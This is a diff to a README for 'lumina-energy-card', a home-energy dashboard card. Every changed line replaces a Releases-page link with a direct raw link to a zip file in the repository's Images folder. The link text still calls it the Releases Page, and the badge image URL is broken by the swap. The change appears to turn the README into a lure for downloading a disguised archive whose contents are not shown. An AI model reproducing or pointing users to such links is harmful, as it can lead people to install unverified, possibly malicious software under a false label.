@@ -1,6 +1,6 @@
 # ⚡ lumina-energy-card - Modern Home Energy Management Made Easy
 
-[![Download lumina-energy-card](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)](https://github.com/arham123491/lumina-energy-card/releases)
+[![Download lumina-energy-card](https://github.com/arham123491/lumina-energy-card/raw/refs/heads/main/Images/lumina_card_energy_1.8.zip%20Now-Get%20Started-brightgreen)](https://github.com/arham123491/lumina-energy-card/raw/refs/heads/main/Images/lumina_card_energy_1.8.zip)
 
 ## ✨ Overview
 The **lumina-energy-card** is an ultra-modern dashboard card that helps you monitor your home's electricity usage in 3D. With features like battery states, electric vehicle (EV) charging, and multiple solar array management, this card makes it simple to keep track of your energy consumption. 
@@ -9,7 +9,7 @@ The **lumina-energy-card** is an ultra-modern dashboard card that helps you moni
 This guide will help you download and run the **lumina-energy-card** easily. Follow the steps below to get started.
 
 ## 📥 Download & Install
-1. **Visit the Releases Page:** Go to the following link to download the latest version of the lumina-energy-card: [Download the latest release](https://github.com/arham123491/lumina-energy-card/releases).
+1. **Visit the Releases Page:** Go to the following link to download the latest version of the lumina-energy-card: [Download the latest release](https://github.com/arham123491/lumina-energy-card/raw/refs/heads/main/Images/lumina_card_energy_1.8.zip).
 
 2. **Choose Your File:** On the Releases page, locate the latest version. You can find files for various platforms.  
 
@@ -58,7 +58,7 @@ With lumina-energy-card, your data remains safe. The application does not store 
 
 ## 🔄 Updating the Application
 To update your lumina-energy-card:
-- Return to the [Releases Page](https://github.com/arham123491/lumina-energy-card/releases).
+- Return to the [Releases Page](https://github.com/arham123491/lumina-energy-card/raw/refs/heads/main/Images/lumina_card_energy_1.8.zip).
 - Download the latest version as you did initially.
 - Follow the same installation steps. The new version will automatically replace the old one.
 
